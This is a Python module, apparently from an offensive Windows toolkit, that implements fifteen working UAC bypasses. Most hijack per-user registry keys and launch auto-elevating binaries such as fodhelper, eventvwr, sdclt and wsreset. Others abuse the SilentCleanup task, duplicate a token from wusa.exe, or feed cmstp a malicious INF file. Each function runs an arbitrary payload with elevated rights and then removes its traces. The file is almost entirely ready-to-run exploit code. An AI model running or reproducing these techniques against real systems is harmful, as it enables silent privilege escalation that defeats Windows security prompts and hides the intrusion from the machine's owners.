import tempfile
import shutil
import time

from .utils import *
from .winstructures import *

uac1_info = {
    "Description": "UAC bypass using runas",
    "Method": "Windows API, this only works if UAC is set to never notify",
    "Id": "1",
    "Type": "UAC bypass",
    "Fixed In": "99999" if uac_level() == 1 else "0",
    "Works From": "7600",
    "Admin": False,
    "Function Name": "uac1",
    "Function Payload": True,
}


def uac1(payload):
    params = " ".join(payload[1:])
    payload = payload[0]

    if runas(payload=payload, params=params):
        log.info(f"Successfully elevated process ({payload} {params})")
        return 1
    else:
        log.error(f"Unable to elevate process ({payload} {params})")


uac2_info = {
    "Description": "UAC bypass using fodhelper.exe",
    "Method": "Registry key (Class) manipulation",
    "Id": "2",
    "Type": "UAC bypass",
    "Fixed In": "99999" if not uac_level() == 4 else "0",
    "Works From": "10240",
    "Admin": False,
    "Function Name": "uac2",
    "Function Payload": True,
}


def uac2_cleanup(path):
    log.debug("Performing cleaning")
    if remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
        log.info("Successfully cleaned up")
        log.info("All done!")
    else:
        log.error("Unable to cleanup")


def uac2(payload):
    path = "Software\\Classes\\ms-settings\\shell\\open\\command"

    if modify_key(hkey="hkcu", path=path, name=None, value=" ".join(payload), create=True):
        if modify_key(hkey="hkcu", path=path, name="DelegateExecute", value=None, create=True):
            log.info(f"Successfully created Default and DelegateExecute key containing payload ({' '.join(payload)})")
        else:
            uac2_cleanup(path)
            return
    else:
        log.error("Unable to create registry keys")
        return

    log.debug("Disabling file system redirection")
    with disable_fsr():
        log.info("Successfully disabled file system redirection")
        if create("fodhelper.exe", get_exit_code=True) is not None:
            log.info(f"Successfully spawned process ({' '.join(payload)})")
            uac2_cleanup(path)
            return -1
        log.error(f"Unable to spawn process ({' '.join(payload)})")
        uac2_cleanup(path)


uac3_info = {
    "Description": "UAC bypass using slui.exe",
    "Method": "Registry key (Class) manipulation",
    "Id": "3",
    "Type": "UAC bypass",
    "Fixed In": "99999" if not uac_level() == 4 else "0",
    "Works From": "9600",
    "Admin": False,
    "Function Name": "uac3",
    "Function Payload": True,
}


def uac3_cleanup(path):
    log.debug("Performing cleaning")
    if remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
        log.info("Successfully cleaned up")
        log.info("All done!")
    else:
        log.error("Unable to cleanup")


def uac3(payload):
    path = "Software\\Classes\\exefile\\shell\\open\\command"

    if modify_key(hkey="hkcu", path=path, name=None, value=" ".join(payload), create=True):
        if modify_key(hkey="hkcu", path=path, name="DelegateExecute", value=None, create=True):
            log.info(f"Successfully created Default and DelegateExecute key containing payload ({' '.join(payload)})")
        else:
            log.error("Unable to create registry keys")
            uac3_cleanup(path)
            return
    else:
        log.error("Unable to create registry keys")
        return

    time.sleep(5)

    log.debug("Disabling file system redirection")
    with disable_fsr():
        log.info("Successfully disabled file system redirection")
        if runas("slui.exe"):
            log.info(f"Successfully spawned process ({' '.join(payload)})")
            time.sleep(5)
            uac3_cleanup(path)
            return 1
        log.error(f"Unable to spawn process ({' '.join(payload)})")
        uac3_cleanup(path)


uac4_info = {
    "Description": "UAC bypass using silentcleanup scheduled task",
    "Method": "Registry key (Environment) manipulation, this bypasses UAC's Always Notify.",
    "Id": "4",
    "Type": "UAC bypass",
    "Fixed In": "99999",
    "Works From": "9600",
    "Admin": False,
    "Function Name": "uac4",
    "Function Payload": True,
}


def uac4_cleanup(path):
    log.debug("Performing cleaning")
    if remove_key(hkey="hkcu", path=path, name="windir", delete_key=False):
        log.info("Successfully cleaned up")
    else:
        log.error("Unable to cleanup")


def uac4(payload):
    path = "Environment"

    if modify_key(hkey="hkcu", path=path, name="windir", value=f'cmd.exe /c start "" "{" ".join(payload)}" &&', create=True):
        log.info(f"Successfully created WINDIR key containing payload ({' '.join(payload)})")
    else:
        log.error("Unable to create registry keys")
        return

    log.debug("Disabling file system redirection")
    with disable_fsr():
        log.info("Successfully disabled file system redirection")
        if create("schtasks.exe", params="/Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I", get_exit_code=True) is not None:
            log.info(f"Successfully spawned process ({' '.join(payload)})")
            uac4_cleanup(path)
            return -1
        log.error(f"Unable to spawn process ({' '.join(payload)})")
        uac4_cleanup(path)



uac5_info = {
    "Description": "UAC bypass using sdclt.exe (IsolatedCommand)",
    "Method": "Method: Registry key (Class) manipulation",
    "Id": "5",
    "Type": "UAC bypass",
    "Fixed In": "17025" if not uac_level() == 4 else "0",
    "Works From": "10240",
    "Admin": False,
    "Function Name": "uac5",
    "Function Payload": True
}


def uac5_cleanup(path):
    log.debug("Performing cleaning")
    if remove_key(hkey="hkcu", path=path, name="IsolatedCommand", delete_key=False):
        log.info("Successfully cleaned up")
        log.info("All done!")
    else:
        log.error("Unable to cleanup")


def uac5(payload):
    path = "Software\\Classes\\exefile\\shell\\runas\\command"

    if modify_key(hkey="hkcu", path=path, name="IsolatedCommand", value=" ".join(payload), create=True):
        log.info(f"Successfully created IsolatedCommand key containing payload ({' '.join(payload)})")
    else:
        log.error("Unable to create registry keys")
        return

    time.sleep(5)

    log.debug("Disabling file system redirection")
    with disable_fsr():
        log.info("Successfully disabled file system redirection")
        if create("sdclt.exe", params="/kickoffelev"):
            log.info(f"Successfully spawned process ({' '.join(payload)})")
            time.sleep(5)
            uac5_cleanup(path)
            return 1
        else:
            log.error(f"Unable to spawn process ({' '.join(payload)})")
            uac5_cleanup(path)


uac6_info = {
    "Description": "UAC bypass using sdclt.exe (App Paths)",
    "Method": "Method: Registry key (App Paths) manipulation",
    "Id": "6",
    "Type": "UAC bypass",
    "Fixed In": "16215" if not uac_level() == 4 else "0",
    "Works From": "10240",
    "Admin": False,
    "Function Name": "uac6",
    "Function Payload": True,
}


def uac6_cleanup(path):
    log.debug("Performing cleaning")
    if remove_key(hkey="hkcu", path=path, name=None, delete_key=False):
        log.info("Successfully cleaned up")
        log.info("All done!")
    else:
        log.error("Unable to cleanup")


def uac6(payload):
    path = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe"

    if modify_key(hkey="hkcu", path=path, name=None, value=" ".join(payload), create=True):
        log.info(f"Successfully created Default key containing payload ({' '.join(payload)})")
    else:
        log.error("Unable to create registry keys")
        return

    time.sleep(5)

    log.debug("Disabling file system redirection")
    with disable_fsr():
        log.info("Successfully disabled file system redirection")
        if create("sdclt.exe"):
            log.info(f"Successfully spawned process ({' '.join(payload)})")
            time.sleep(5)
            uac6_cleanup(path)
            return 1
        else:
            log.error(f"Unable to spawn process ({' '.join(payload)})")
            uac6_cleanup(path)


uac7_info = {
    "Description": "UAC bypass using perfmon.exe",
    "Method": "Registry key (Volatile Environment) manipulation",
    "Id": "7",
    "Type": "UAC bypass",
    "Fixed In": "16299" if not uac_level() == 4 else "0",
    "Works From": "7600",
    "Admin": False,
    "Function Name": "uac7",
    "Function Payload": True,
}


def uac7_cleanup(path):
    log.debug("Performing cleaning")
    if remove_key(hkey="hkcu", path=path, name="SYSTEMROOT", delete_key=False):
        log.info("Successfully cleaned up")
        log.info("All done!")
    else:
        log.error("Unable to cleanup")


def uac7(payload):
    path = "Volatile Environment"
    temp = tempfile.gettempdir()

    if modify_key(hkey="hkcu", path=path, name="SYSTEMROOT", value=temp, create=True):
        log.info(f"Successfully created SYSTEMROOT key containing a new temp directory ({temp})")
    else:
        log.error("Unable to create registry keys")
        return

    temp = os.path.join(temp, "system32")
    if not os.path.exists(temp):
        try:
            os.makedirs(temp)
            log.info(f"Successfully created directory ({temp})")
        except Exception as error:
            log.error(f"Unable to create directory ({temp})")
            uac7_cleanup(path)
            return
    else:
        log.warning(f"Directory already exists ({temp}) using existing one")

    time.sleep(5)

    try:
        os.remove(os.path.join(temp, "mmc.exe"))
    except Exception as error:
        pass

    try:
        shutil.copy(payload[0], os.path.join(temp, "mmc.exe"))
        log.info(f"Successfully copied payload to directory ({temp})")
    except shutil.Error as error:
        log.error(f"Unable to copy payload to directory ({temp})")
        uac7_cleanup(path)
        return
    except IOError as error:
        log.error(f"Unable to copy payload to directory ({temp})")
        uac7_cleanup(path)
        return
    time.sleep(5)

    log.debug("Disabling file system redirection")
    with disable_fsr():
        log.info("Successfully disabled file system redirection")
        if create("perfmon.exe"):
            log.info(f"Successfully spawned process ({payload[0]})")
            time.sleep(5)
            uac7_cleanup(path)
            return 1
        else:
            log.error(f"Unable to spawn process ({payload[0]})")
            uac7_cleanup(path)


uac8_info = {
    "Description": "UAC bypass using eventvwr.exe",
    "Method": "Registry key (Class) manipulation",
    "Id": "8",
    "Type": "UAC bypass",
    "Fixed In": "15031" if not uac_level() == 4 else "0",
    "Works From": "7600",
    "Admin": False,
    "Function Name": "uac8",
    "Function Payload": True,
}


def uac8_cleanup(path):
    log.debug("Performing cleaning")
    if remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
        log.info("Successfully cleaned up")
    else:
        log.error("Unable to cleanup")


def uac8(payload):
    path = "Software\\Classes\\mscfile\\shell\\open\\command"

    if modify_key(hkey="hkcu", path=path, name=None, value=" ".join(payload), create=True):
        log.info(f"Successfully created Default key containing payload ({' '.join(payload)})")
    else:
        log.error("Unable to create registry keys")
        return

    time.sleep(5)

    log.debug("Disabling file system redirection")
    with disable_fsr():
        log.info("Successfully disabled file system redirection")
        if create("eventvwr.exe"):
            log.info(f"Successfully spawned process ({' '.join(payload)})")
            time.sleep(5)
            uac8_cleanup(path)
            return 1
        else:
            log.error(f"Unable to spawn process ({' '.join(payload)})")
            uac8_cleanup(path)


uac9_info = {
    "Description": "UAC bypass using compmgmtlauncher.exe",
    "Method": "Registry key (Class) manipulation",
    "Id": "9",
    "Type": "UAC bypass",
    "Fixed In": "15031" if not uac_level() == 4 else "0",
    "Works From": "7600",
    "Admin": False,
    "Function Name": "uac9",
    "Function Payload": True,
}


def uac9_cleanup(path):
    log.debug("Performing cleaning")
    if remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
        log.info("Successfully cleaned up")
        log.info("All done!")
    else:
        log.error("Unable to cleanup")


def uac9(payload):
    path = "Software\\Classes\\mscfile\\shell\\open\\command"

    if modify_key(hkey="hkcu", path=path, name=None, value=" ".join(payload), create=True):
        log.info(f"Successfully created Default key containing payload ({' '.join(payload)})")
    else:
        log.error("Unable to create registry keys")
        return

    time.sleep(5)

    log.debug("Disabling file system redirection")
    with disable_fsr():
        log.info("Successfully disabled file system redirection")
        if create("CompMgmtLauncher.exe"):
            log.info(f"Successfully spawned process ({' '.join(payload)})")
            time.sleep(5)
            uac9_cleanup(path)
            return 1
        else:
            log.error(f"Unable to spawn process ({' '.join(payload)})")
            uac9_cleanup(path)


uac10_info = {
    "Description": "UAC bypass using computerdefaults.exe",
    "Method": "Registry key (Class) manipulation",
    "Id": "10",
    "Type": "UAC bypass",
    "Fixed In": "99999" if not uac_level() == 4 else "0",
    "Works From": "10240",
    "Admin": False,
    "Function Name": "uac10",
    "Function Payload": True,
}


def uac10_cleanup(path):
    log.debug("Performing cleaning")
    if remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
        log.info("Successfully cleaned up")
        log.info("All done!")
    else:
        log.error("Unable to cleanup")


def uac10(payload):
    path = "Software\\Classes\\ms-settings\\shell\\open\\command"

    if modify_key(hkey="hkcu", path=path, name=None, value=" ".join(payload), create=True):
        if modify_key(hkey="hkcu", path=path, name="DelegateExecute", value=None, create=True):
            log.info(f"Successfully created Default and DelegateExecute key containing payload ({' '.join(payload)})")
        else:
            log.error("Unable to create registry keys")
            uac10_cleanup(path)
            return
    else:
        log.error("Unable to create registry keys")
        return

    log.debug("Disabling file system redirection")
    with disable_fsr():
        log.info("Successfully disabled file system redirection")
        if create("computerdefaults.exe", get_exit_code=True) is not None:
            log.info(f"Successfully spawned process ({' '.join(payload)})")
            uac10_cleanup(path)
            return -1
        else:
            log.error(f"Unable to spawn process ({' '.join(payload)})")
            uac10_cleanup(path)


# Creds to: https://gist.github.com/highsenburger69/b86eb4db41e651a6518fd61d88aa9f91


uac11_info = {
    "Description": "UAC bypass using token manipulation",
    "Method": "Token manipulation",
    "Id": "11",
    "Type": "UAC bypass",
    "Fixed In": "17686" if not uac_level() == 4 else "0",
    "Works From": "7600",
    "Admin": False,
    "Function Name": "uac11",
    "Function Payload": True,
}


def uac11(payload):
    log.debug("Launching elevated process")
    ShellExecute = ShellExecuteInfoW()
    ShellExecute.cbSize = sizeof(ShellExecute)
    ShellExecute.fMask = 0x00000040
    ShellExecute.lpFile = u"wusa.exe"
    ShellExecute.nShow = 0

    if not ShellExecuteEx(byref(ShellExecute)):
        log.error(f"Error while triggering elevated binary using ShellExecuteEx: {GetLastError()}")
    else:
        log.info("Successfully started process")

    log.debug("Grabbing token")
    hToken = HANDLE(c_void_p(-1).value)
    if NtOpenProcessToken(ShellExecute.hProcess, 0x02000000, byref(hToken)) == STATUS_UNSUCCESSFUL:
        log.error(f"Error while opening target process token using NtOpenProcessToken: {GetLastError()}")

    TerminateProcess(ShellExecute.hProcess, -1)
    WaitForSingleObject(ShellExecute.hProcess, -1)

    log.debug("Opening token of elevated process")
    newhToken = HANDLE(c_void_p(-1).value)
    SECURITY_ATTRIBUTE = SECURITY_ATTRIBUTES()

    if DuplicateTokenEx(
        hToken, TOKEN_ALL_ACCESS, byref(SECURITY_ATTRIBUTE),
        SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
        TOKEN_TYPE.TokenPrimary, byref(newhToken)
    ) == STATUS_UNSUCCESSFUL:
        log.error(f"Error while duplicating Primary token using DuplicateTokenEx: {GetLastError()}")

    log.debug("Duplicating primary token")
    mlAuthority = SID_IDENTIFIER_AUTHORITY((0, 0, 0, 0, 0, 16))
    pIntegritySid = LPVOID()

    if RtlAllocateAndInitializeSid(
        byref(mlAuthority), 1, IntegrityLevel.SECURITY_MANDATORY_MEDIUM_RID,
        0, 0, 0, 0, 0, 0, 0, byref(pIntegritySid)
    ) == STATUS_UNSUCCESSFUL:
        log.error(f"Error while initializing Medium IL SID using RtlAllocateAndInitializeSid: {GetLastError()}")

    log.debug("Initializing a SID for Medium Integrity level")
    SID_AND_ATTRIBUTE = SID_AND_ATTRIBUTES()
    SID_AND_ATTRIBUTE.Sid = pIntegritySid
    SID_AND_ATTRIBUTE.Attributes = GroupAttributes.SE_GROUP_INTEGRITY
    TOKEN_MANDATORY = TOKEN_MANDATORY_LABEL()
    TOKEN_MANDATORY.Label = SID_AND_ATTRIBUTE

    if NtSetInformationToken(
        newhToken, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, byref(TOKEN_MANDATORY), sizeof(TOKEN_MANDATORY)
    ) == STATUS_UNSUCCESSFUL:
        log.error(f"Error while setting medium IL token using NtSetInformationToken: {GetLastError()}")

    log.debug("Now we are lowering the token's integrity level from High to Medium")
    hLuaToken = HANDLE(c_void_p(-1).value)
    if NtFilterToken(newhToken, 0x4, None, None, None, byref(hLuaToken)) == STATUS_UNSUCCESSFUL:
        log.error(f"Error while creating a restricted token using NtFilterToken: {GetLastError()}")

    log.debug("Creating restricted token")
    ImpersonateLoggedOnUser(hLuaToken)

    log.debug("Impersonating logged on user")
    lpStartupInfo = STARTUPINFO()
    lpStartupInfo.cb = sizeof(lpStartupInfo)
    lpProcessInformation = PROCESS_INFORMATION()
    lpStartupInfo.dwFlags = 0x00000001
    lpStartupInfo.wShowWindow = 5
    lpApplicationName = " ".join(payload)

    if not CreateProcessWithLogonW(
        u"aaa", u"bbb", u"ccc", 0x00000002, lpApplicationName, None,
        0x00000010, None, None, byref(lpStartupInfo), byref(lpProcessInformation)
    ):
        log.error(f"Error while triggering admin payload using CreateProcessWithLogonW: {GetLastError()}")
    else:
        log.info(f"Successfully executed payload with PID: {lpProcessInformation.dwProcessId}")
        return 1

# http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass


uac12_info = {
    "Description": "UAC bypass using sdclt.exe (Folder)",
    "Method": "Registry key (Class) manipulation",
    "Id": "12",
    "Type": "UAC bypass",
    "Fixed In": "99999" if not uac_level() == 4 else "0",
    "Works From": "14393",
    "Admin": False,
    "Function Name": "uac12",
    "Function Payload": True,
}


def uac12_cleanup(path):
    log.debug("Performing cleaning")
    if remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
        log.info("Successfully cleaned up")
        log.info("All done!")
    else:
        log.error("Unable to cleanup")


def uac12(payload):
    path = "Software\\Classes\\Folder\\shell\\open\\command"

    if modify_key(hkey="hkcu", path=path, name=None, value=" ".join(payload), create=True):
        if modify_key(hkey="hkcu", path=path, name="DelegateExecute", value=None, create=True):
            log.info(f"Successfully created Default and DelegateExecute key containing payload ({' '.join(payload)})")
        else:
            log.error("Unable to create registry keys")
            uac12_cleanup(path)
            return
    else:
        log.error("Unable to create registry keys")
        return

    log.debug("Disabling file system redirection")
    with disable_fsr():
        log.info("Successfully disabled file system redirection")
        if create("sdclt.exe"):
            log.info(f"Successfully spawned process ({' '.join(payload)})")
            time.sleep(5)
            uac12_cleanup(path)
            return 1
        log.error(f"Unable to spawn process ({' '.join(payload)})")
        uac12_cleanup(path)

# https://oddvar.moe/2017/08/15/research-on-cmstp-exe/


uac13_info = {
    "Description": "UAC bypass using cmstp.exe",
    "Method": "Malicious ini file",
    "Id": "13",
    "Type": "UAC bypass",
    "Fixed In": "99999" if not uac_level() == 4 else "0",
    "Works From": "7600",
    "Admin": False,
    "Function Name": "uac13",
    "Function Payload": True,
}


def uac13_cleanup():
    log.debug("Performing cleaning")
    try:
        os.remove(os.path.join(tempfile.gettempdir(), "tmp.ini"))
        log.info("Successfully cleaned up")
        log.info("All done!")
    except Exception as error:
        log.error("Unable to clean up, manual cleaning is needed")


def uac13(payload):
    inf_template = '''[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
''' + " ".join(payload) + '''
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="WinPwnageVPN"
ShortSvcName="WinPwnageVPN"
'''
    temp = os.path.join(tempfile.gettempdir(), "tmp.ini")
    try:
        ini_file = open(temp, "w")
        ini_file.write(inf_template)
        ini_file.close()
        log.info(f"Successfully wrote ini template to disk ({temp})")
    except Exception:
        log.error(f"Cannot proceed, unable to ini file to disk ({temp})")
        return

    time.sleep(1)

    # if terminate("cmstp.exe"):
    #     log.info("Successfully terminated cmstp process")

    time.sleep(1)

    if create("cmstp.exe", params=f"/au {temp}", window=False):
        log.info("Successfully triggered installation of ini file using cmstp binary")
    else:
        log.error("Unable to trigger installation of ini file using cmstp binary")
        uac13_cleanup()
        return

    time.sleep(1)

    if ctypes.windll.user32.keybd_event(0x0D, 0, 0, 0):
        log.info("Successfully sent keyboard-event to window")
        time.sleep(5)
        uac13_cleanup()
        return 1
    else:
        log.error("Unable to send keyboard-event to window")
        uac13_cleanup()

# https://www.activecyber.us/activelabs/windows-uac-bypass


uac14_info = {
    "Description": "UAC bypass using wsreset.exe",
    "Method": "Registry key (Class) manipulation",
    "Id": "14",
    "Type": "UAC bypass",
    "Fixed In": "99999" if not uac_level() == 4 else "0",
    "Works From": "17134",
    "Admin": False,
    "Function Name": "uac14",
    "Function Payload": True,
}


def uac14_cleanup(path):
    log.debug("Performing cleaning")
    if remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
        log.info("Successfully cleaned up")
        log.info("All done!")
    else:
        log.error("Unable to cleanup")


def uac14(payload):
    path = "Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command"

    if modify_key(hkey="hkcu", path=path, name=None, value="{cmd_path} /c start {payload}".format(
        cmd_path=os.path.join(system_directory(), "cmd.exe"), payload=" ".join(payload)
    ), create=True):
        if modify_key(hkey="hkcu", path=path, name="DelegateExecute", value=None, create=True):
            log.info(f"Successfully created Default and DelegateExecute key containing payload ({' '.join(payload)})")
        else:
            log.error("Unable to create registry keys")
            uac14_cleanup(path)
            return
    else:
        log.error("Unable to create registry keys")
        return

    time.sleep(5)

    log.debug("Disabling file system redirection")
    with disable_fsr():
        log.info("Successfully disabled file system redirection")

        log.debug("Waiting for wsreset.exe to finish, this can take a few seconds")
        if not create("WSReset.exe", get_exit_code=True):
            log.info(f"Successfully spawned process ({' '.join(payload)})")
            time.sleep(5)
            uac14_cleanup(path)
            return 1
        else:
            log.error(f"Unable to spawn process ({' '.join(payload)})")
            uac14_cleanup(path)

# https://rootm0s.github.io


uac15_info = {
    "Description": "UAC bypass using slui.exe and changepk.exe",
    "Method": "Registry key (Class) manipulation",
    "Id": "15",
    "Type": "UAC bypass",
    "Fixed In": "99999" if not uac_level() == 4 else "0",
    "Works From": "17763",
    "Admin": False,
    "Function Name": "uac15",
    "Function Payload": True,
}


def uac15_cleanup(path):
    log.debug("Performing cleaning")
    if remove_key(hkey="hkcu", path=path, name=None, delete_key=True):
        log.info("Successfully cleaned up")
        log.info("All done!")
    else:
        log.error("Unable to cleanup")


def uac15(payload):
    path = "Software\\Classes\\Launcher.SystemSettings\\shell\\open\\command"

    if modify_key(hkey="hkcu", path=path, name=None, value=" ".join(payload), create=True):
        if modify_key(hkey="hkcu", path=path, name="DelegateExecute", value=None, create=True):
            log.info(f"Successfully created Default and DelegateExecute key containing payload ({' '.join(payload)})")
        else:
            log.error("Unable to create registry keys")
            uac15_cleanup(path)
            return
    else:
        log.error("Unable to create registry keys")
        return

    time.sleep(5)

    log.debug("Disabling file system redirection")
    with disable_fsr():
        log.info("Successfully disabled file system redirection")
        if runas(os.path.join("slui.exe")):
            log.info(f"Successfully spawned process ({' '.join(payload)})")
            time.sleep(5)
            uac15_cleanup(path)
            return 1
        else:
            log.error(f"Unable to spawn process ({' '.join(payload)})")
            uac15_cleanup(path)
